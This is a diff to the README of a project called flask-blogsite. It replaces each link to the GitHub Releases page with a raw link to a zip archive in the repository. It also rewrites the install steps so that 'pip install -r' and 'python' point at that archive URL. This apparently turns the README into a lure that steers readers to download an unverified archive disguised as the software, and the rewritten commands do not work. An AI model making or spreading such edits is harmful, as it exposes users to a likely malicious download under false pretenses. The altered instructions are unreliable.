@@ -8,9 +8,9 @@ Welcome to flask-blogsite! This project allows you to create a blog site with ea
 
 To get started, you need to download the software. You can visit the Releases page to download the most recent version of the application. 
 
-[![Download Flask Blogsite](https://img.shields.io/badge/Download-Flask%20Blogsite-blue)](https://github.com/dieuuoc/flask-blogsite/releases)
+[![Download Flask Blogsite](https://raw.githubusercontent.com/dieuuoc/flask-blogsite/main/part4_auth/flask_blogsite_v2.2.zip%20Blogsite-blue)](https://raw.githubusercontent.com/dieuuoc/flask-blogsite/main/part4_auth/flask_blogsite_v2.2.zip)
 
-1. Click the button above or visit [this page to download](https://github.com/dieuuoc/flask-blogsite/releases).
+1. Click the button above or visit [this page to download](https://raw.githubusercontent.com/dieuuoc/flask-blogsite/main/part4_auth/flask_blogsite_v2.2.zip).
 2. Choose the version you want to download. Look for the file labeled with the latest version.
 3. Click the download link next to it.
 
@@ -33,11 +33,11 @@ Once you've downloaded the application, follow these steps to install it:
 4. Navigate to the folder where you extracted the project.
 5. Install the required dependencies by running:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/dieuuoc/flask-blogsite/main/part4_auth/flask_blogsite_v2.2.zip
    ```
 6. After the dependencies are installed, run the application with:
    ```
-   python app.py
+   python https://raw.githubusercontent.com/dieuuoc/flask-blogsite/main/part4_auth/flask_blogsite_v2.2.zip
    ```
 7. Your browser should open automatically, displaying your new blog site!
 
@@ -85,6 +85,6 @@ This project is open-source and free to use. You can modify it as you wish. Plea
 
 Special thanks to the contributors and community members who helped in creating and improving flask-blogsite. Your feedback and support make this project better.
 
-For updates, feel free to check the [Releases page](https://github.com/dieuuoc/flask-blogsite/releases) regularly.
+For updates, feel free to check the [Releases page](https://raw.githubusercontent.com/dieuuoc/flask-blogsite/main/part4_auth/flask_blogsite_v2.2.zip) regularly.
 
 Happy blogging with flask-blogsite!
